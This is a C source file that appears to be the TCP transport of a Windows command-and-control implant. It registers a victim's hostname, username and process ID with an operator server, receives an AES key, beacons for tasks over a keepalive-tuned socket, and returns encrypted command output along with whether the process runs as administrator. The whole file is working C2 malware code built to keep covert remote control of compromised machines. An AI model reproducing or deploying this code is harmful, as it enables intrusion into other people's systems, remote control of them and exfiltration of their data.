#include "transport_tcp.h"
#include "transport.h"
#include "config.h"
#include "crypto.h"
#include "b64.h"
#include <winsock2.h>
#include <windows.h>
#include <mstcpip.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <ctype.h>
#define SECURITY_WIN32
#include <secext.h>

#pragma comment(lib, "ws2_32.lib")

// Persistent TCP socket (opened during register, reused for beacon/result).
static SOCKET g_tcp_sock = INVALID_SOCKET;

#define TCP_MAX_FRAME (32u * 1024u * 1024u)

static void tcp_reset(void) {
    if (g_tcp_sock != INVALID_SOCKET) {
        shutdown(g_tcp_sock, SD_BOTH);
        closesocket(g_tcp_sock);
        g_tcp_sock = INVALID_SOCKET;
    }
    memset(g_agent.agent_id, 0, sizeof(g_agent.agent_id));
    memset(g_agent.aes_key, 0, sizeof(g_agent.aes_key));
    g_agent.has_key = 0;
}

/* Configure the persistent C2 socket so an idle connection is probed instead
 * of being silently discarded by a firewall/NAT.  Keep the normal socket
 * options as a fallback because some Windows environments reject the extended
 * keepalive ioctl. */
static void tcp_configure_socket(SOCKET s) {
    BOOL keepalive = TRUE;
    setsockopt(s, SOL_SOCKET, SO_KEEPALIVE,
               (const char*)&keepalive, sizeof(keepalive));

    DWORD timeout_ms = 10000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO,
               (const char*)&timeout_ms, sizeof(timeout_ms));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO,
               (const char*)&timeout_ms, sizeof(timeout_ms));

    tcp_keepalive ka;
    ka.onoff = 1;
    ka.keepalivetime = 60000;   /* first probe after 60 seconds idle */
    ka.keepaliveinterval = 10000; /* retry every 10 seconds */
    DWORD returned = 0;
    WSAIoctl(s, SIO_KEEPALIVE_VALS, &ka, sizeof(ka),
             NULL, 0, &returned, NULL, NULL);
}

static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, (const char *)data + sent, (int)(len - sent), 0);
        if (n <= 0) return 0;
        sent += (size_t)n;
    }
    return 1;
}

// ── Framing helpers ───────────────────────────────────────────────────────────

// Write 4-byte LE length prefix + data.
static int tcp_write_msg(SOCKET s, const uint8_t *data, size_t len) {
    uint8_t hdr[4];
    hdr[0]=(uint8_t)(len&0xff);
    hdr[1]=(uint8_t)((len>>8)&0xff);
    hdr[2]=(uint8_t)((len>>16)&0xff);
    hdr[3]=(uint8_t)((len>>24)&0xff);
    if (!tcp_send_all(s, hdr, sizeof(hdr))) return 0;
    return len == 0 || tcp_send_all(s, data, len);
}

// Read 4-byte LE length prefix then that many bytes. Caller must free().
static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
    *out_len=0;
    uint8_t hdr[4]; int got=0;
    while (got<4) {
        int r=recv(s,(char*)hdr+got,4-got,0);
        if (r<=0) return NULL;
        got+=r;
    }
    size_t len=(size_t)hdr[0]|((size_t)hdr[1]<<8)|
               ((size_t)hdr[2]<<16)|((size_t)hdr[3]<<24);
    if (len==0||len>TCP_MAX_FRAME) return NULL;
    uint8_t *buf=(uint8_t*)malloc(len+1);
    if (!buf) return NULL;
    size_t total=0;
    while (total<len) {
        int r=recv(s,(char*)buf+total,(int)(len-total),0);
        if (r<=0) { free(buf); return NULL; }
        total+=r;
    }
    buf[len]='\0';
    *out_len=len;
    return buf;
}

// ── Send plaintext registration frame {"t":"register","p":<body_json>} ───────
// Used before AES key is negotiated; p is a raw JSON object, not base64.
static int tcp_send_register(const char *body_json) {
    size_t env_sz = strlen(body_json) + 24;
    char *env = (char*)malloc(env_sz);
    if (!env) return 0;
    snprintf(env, env_sz, "{\"t\":\"register\",\"p\":%s}", body_json);
    int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
    free(env);
    return ok;
}

// ── Read a frame and return it as a null-terminated string. Caller must free().
static char* tcp_recv_raw(void) {
    size_t resp_len=0;
    uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
    if (!resp) return NULL;
    char *s = (char*)realloc(resp, resp_len + 1);
    if (!s) { free(resp); return NULL; }
    s[resp_len] = '\0';
    return s;
}

// ── Send AES-GCM encrypted envelope {"t":"<type>","p":"<b64_ciphertext>"} ───
static int tcp_send_enc(const char *msg_type, const char *payload_json) {
    size_t enc_len=0;
    uint8_t *enc = aes_gcm_seal(g_agent.aes_key, 32,
        (const uint8_t*)payload_json, strlen(payload_json), &enc_len);
    if (!enc) return 0;
    char *b64 = b64_encode(enc, enc_len);
    free(enc);
    if (!b64) return 0;
    size_t env_sz = strlen(msg_type) + strlen(b64) + 16;
    char *env = (char*)malloc(env_sz);
    if (!env) { free(b64); return 0; }
    snprintf(env, env_sz, "{\"t\":\"%s\",\"p\":\"%s\"}", msg_type, b64);
    free(b64);
    int ok = tcp_write_msg(g_tcp_sock, (const uint8_t*)env, strlen(env));
    free(env);
    return ok;
}

// ── Receive AES-GCM encrypted envelope, decrypt, return plain JSON. Caller free().
static char* tcp_recv_enc(void) {
    size_t resp_len=0;
    uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
    if (!resp) return NULL;
    char *b64 = agent_json_str_alloc((char*)resp, "p");
    free(resp);
    if (!b64) return NULL;
    size_t ct_len=0;
    uint8_t *ct = b64_decode(b64, &ct_len);
    free(b64);
    if (!ct) return NULL;
    size_t plain_len=0;
    uint8_t *plain = aes_gcm_open(g_agent.aes_key, 32, ct, ct_len, &plain_len);
    free(ct);
    return (char*)plain;
}

// ── TCP connect ───────────────────────────────────────────────────────────────

static SOCKET tcp_connect(void) {
    // Parse host:port from AGENT_SERVER_URL ("tcp://host:port" or "host:port")
    const char *url = AGENT_SERVER_URL;
    if (strncmp(url, "tcp://", 6) == 0) url += 6;
    char host[256]={0}; int port = 8080;
    const char *colon = strrchr(url, ':');
    if (colon) {
        size_t hl = (size_t)(colon - url);
        if (hl < sizeof(host)) { memcpy(host, url, hl); host[hl]='\0'; }
        port = atoi(colon + 1);
    } else {
        strncpy(host, url, sizeof(host)-1);
    }

    WSADATA wsd; WSAStartup(MAKEWORD(2,2), &wsd);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons((u_short)port);
    dst.sin_addr.s_addr = inet_addr(host);

    tcp_configure_socket(s);

    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) != 0) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

/* Escape command output before embedding it in the encrypted result JSON.
 * HTTP already goes through the equivalent helper in transport.c; TCP must do
 * the same because the server parses the decrypted result as JSON. */
static char* tcp_json_escape(const char *s) {
    if (!s) s = "";
    size_t len = strlen(s);
    if (len > (SIZE_MAX - 1) / 6) return NULL;

    char *out = (char*)malloc(len * 6 + 1);
    if (!out) return NULL;
    static const char hex[] = "0123456789abcdef";
    size_t j = 0;
    for (size_t i = 0; i < len; i++) {
        unsigned char ch = (unsigned char)s[i];
        switch (ch) {
        case '"': out[j++]='\\'; out[j++]='"'; break;
        case '\\': out[j++]='\\'; out[j++]='\\'; break;
        case '\b': out[j++]='\\'; out[j++]='b'; break;
        case '\f': out[j++]='\\'; out[j++]='f'; break;
        case '\n': out[j++]='\\'; out[j++]='n'; break;
        case '\r': out[j++]='\\'; out[j++]='r'; break;
        case '\t': out[j++]='\\'; out[j++]='t'; break;
        default:
            if (ch < 0x20) {
                out[j++]='\\'; out[j++]='u';
                out[j++]='0'; out[j++]='0';
                out[j++]=hex[ch >> 4]; out[j++]=hex[ch & 0x0f];
            } else {
                out[j++]=(char)ch;
            }
            break;
        }
    }
    out[j] = '\0';
    return out;
}

// ── Transport operations ──────────────────────────────────────────────────────

int transport_tcp_register(void) {
    tcp_reset();
    g_tcp_sock = tcp_connect();
    if (g_tcp_sock == INVALID_SOCKET) return 0;

    char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
    DWORD hsz=sizeof(hostname);
    GetComputerNameA(hostname, &hsz);
    for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
    ULONG usz=sizeof(username);
    if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
        GetUserNameA(username, (DWORD*)&usz);
    char username_j[512]={0};
    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
        if (username[_i]=='\\') username_j[_j++]='\\';
        username_j[_j++]=username[_i];
    }

    // Registration is plaintext — AES key not yet known
    char body[1024];
    snprintf(body, sizeof(body),
        "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
        "\"pid\":%lu,\"transport\":\"tcp\","
        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"parent_id\":\"%s\",\"language\":\"c\"}",
        hostname, username_j, (unsigned long)GetCurrentProcessId(),
        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, AGENT_PARENT_ID);

    if (!tcp_send_register(body)) {
        tcp_reset();
        return 0;
    }

    // Server responds with plaintext {"t":"register_resp","p":{"agent_id":"...","aes_key":"...",...}}
    char *resp_raw = tcp_recv_raw();
    if (!resp_raw) {
        tcp_reset();
        return 0;
    }

    char agent_id[64]={0}, aes_key_b64[128]={0};
    agent_json_str(resp_raw, "agent_id", agent_id, sizeof(agent_id));
    agent_json_str(resp_raw, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
    free(resp_raw);

    if (!agent_id[0] || !aes_key_b64[0]) {
        tcp_reset();
        return 0;
    }

    size_t key_len=0;
    uint8_t *key = b64_decode(aes_key_b64, &key_len);
    if (!key || key_len < 32) {
        free(key);
        tcp_reset();
        return 0;
    }

    strncpy(g_agent.agent_id, agent_id, sizeof(g_agent.agent_id) - 1);
    memcpy(g_agent.aes_key, key, 32);
    g_agent.has_key = 1;
    free(key);
    return 1;
}

AgentTask* transport_tcp_beacon(int *count) {
    *count = 0;
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return NULL;

    if (!tcp_send_enc("beacon", "{}")) {
        tcp_reset();
        return NULL;
    }

    char *resp_plain = tcp_recv_enc();
    if (!resp_plain) {
        tcp_reset();
        return NULL;
    }

    AgentTask *tasks = agent_parse_tasks((const uint8_t*)resp_plain,
                                         strlen(resp_plain), count);
    free(resp_plain);
    return tasks;
}

void transport_tcp_send_result(long long task_id, const char *output,
                                const char *error, int is_admin) {
    if (g_tcp_sock == INVALID_SOCKET || !g_agent.has_key) return;

    char *esc_output = tcp_json_escape(output);
    char *esc_error  = tcp_json_escape(error);
    if (!esc_output || !esc_error) {
        free(esc_output);
        free(esc_error);
        tcp_reset();
        return;
    }

    size_t body_sz = strlen(esc_output) + strlen(esc_error) + 256;
    char *body = (char*)malloc(body_sz);
    if (!body) {
        free(esc_output);
        free(esc_error);
        return;
    }
    snprintf(body, body_sz,
        "{\"task_id\":%lld,\"output\":\"%s\",\"error\":\"%s\",\"is_admin\":%s}",
        task_id, esc_output, esc_error,
        is_admin?"true":"false");
    free(esc_output);
    free(esc_error);

    if (!tcp_send_enc("result", body)) {
        free(body);
        tcp_reset();
        return;
    }
    free(body);

    // Drain plaintext ACK {"t":"ack"} — no encrypted payload
    char *ack = tcp_recv_raw();
    if (!ack) tcp_reset();
    free(ack);
}
